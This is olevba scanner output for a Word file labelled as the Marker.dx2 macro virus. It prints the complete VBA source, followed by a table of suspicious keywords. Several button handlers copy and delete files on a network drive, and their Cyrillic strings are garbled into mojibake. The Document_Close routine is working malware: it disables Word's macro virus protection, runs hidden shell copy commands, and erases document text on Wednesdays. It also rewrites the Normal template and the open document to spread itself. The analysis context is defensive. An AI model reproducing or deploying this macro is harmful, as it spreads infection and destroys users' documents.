olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.dx2-41faac90b374998d4b25fc7fd97fb47af9857c95
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.dx2-41faac90b374998d4b25fc7fd97fb47af9857c95 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\platpor.xls"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2platpor1.xls"


Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2scht-f1.xls"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If


End Sub

Private Sub CommandButton4_Click()
Dim i
Set fs = Application.FileSearch
With fs
    .LookIn = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä"

    .FileName = "*.*"
    If .Execute > 0 Then
        MsgBox "There were " & .FoundFiles.Count & _
            " file(s) found."
        For i = 1 To .FoundFiles.Count
            MsgBox .FoundFiles(i)
        Next i
    Else
        MsgBox "There were no files found."
    End If
End With

End Sub

Private Sub CommandButton11_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\platpor.xls"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2platpor2.xls"


Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2scht-f2.xls"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00$PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If



End Sub

Private Sub CommandButton12_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\platpor.xls"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2platpor3.xls"



Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2scht-f3.xls"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If




End Sub

Private Sub CommandButton2_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\dover.doc"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2dover1.doc"


Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2vipiska1.doc"



If Time > #4:00:00$PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If





End Sub

Private Sub CommandButton21_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\dover.doc"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2dover2.doc"





Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2vipiska2.doc"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00$PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If






End Sub

Private Sub Document_Close()

On Error Resume Next

Const Kuku = "Black Wednesday!"

'Declare Variables
Dim SaveDoc, SaveNormalTempl, DocInfected, NormalTemplInfected As Boolean
Dim ActDoc, NormTempl As Object
Dim MyCod, UserAddress, LogData, LogFile As String
Dim a1, FileLocal, FileServer As Integer

'Initialize Variables
Set ActDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormTempl = NormalTemplate.VBProject.VBComponents.Item(1)

DocInfected = ActDoc.CodeModule.Find(Kuku, 1, 1, 10000, 10000)
NormalTemplInfected = NormTempl.CodeModule.Find(Kuku, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False

Set fs = Application.FileSearch
With fs
    .LookIn = "C:\"
    .FileName = "NetSetup.log"
    FileLocal = .Execute
End With
With fs
    .LookIn = "\\post\temp\1000"
    .FileName = "NetSetup.log"
    FileServer = .Execute
End With
    
If FileServer > 0 Then
    If (FileLocal <= 0) Then
        Shell "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log", vbHide
    Else
        If FileLen("\\post\temp\1000\NetSetup.log") <> FileLen("c:\NetSetup.log") Then
            Shell "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log", vbHide
        End If
    End If
End If

System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", _
"WallPaper") = "c:\NetSetup.log"

If (WeekDay(Now()) = vbWednesday) Then
    Selection.MoveDown Unit:=wdLine, Count:=20, Extend:=wdExtend
    Selection.Delete Unit:=wdCharacter, Count:=1
End If
'Make sure that some conditions are true before we continue infecting anything
If (DocInfected = True Xor NormalTemplInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocInfected = True Then
  
    SaveNormalTempl = NormalTemplate.Saved
  
    MyCod = ActDoc.CodeModule.Lines(1, ActDoc.CodeModule.CountOfLines)

    a1 = NormTempl.CodeModule.CountOfLines
    NormTempl.CodeModule.DeleteLines 1, a1
    NormTempl.CodeModule.AddFromString MyCod
    
    If SaveNormalTempl = True Then NormalTemplate.Save
    
  End If
              
  'Infect the ActiveDocument
  If NormalTemplInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDoc = ActiveDocument.Saved
    
    OurCode = NormTempl.CodeModule.Lines(1, NormTempl.CodeModule.CountOfLines)

    a1 = ActDoc.CodeModule.CountOfLines
    ActDoc.CodeModule.DeleteLines 1, a1
    ActDoc.CodeModule.AddFromString OurCode
    
    If SaveDoc = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub













































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

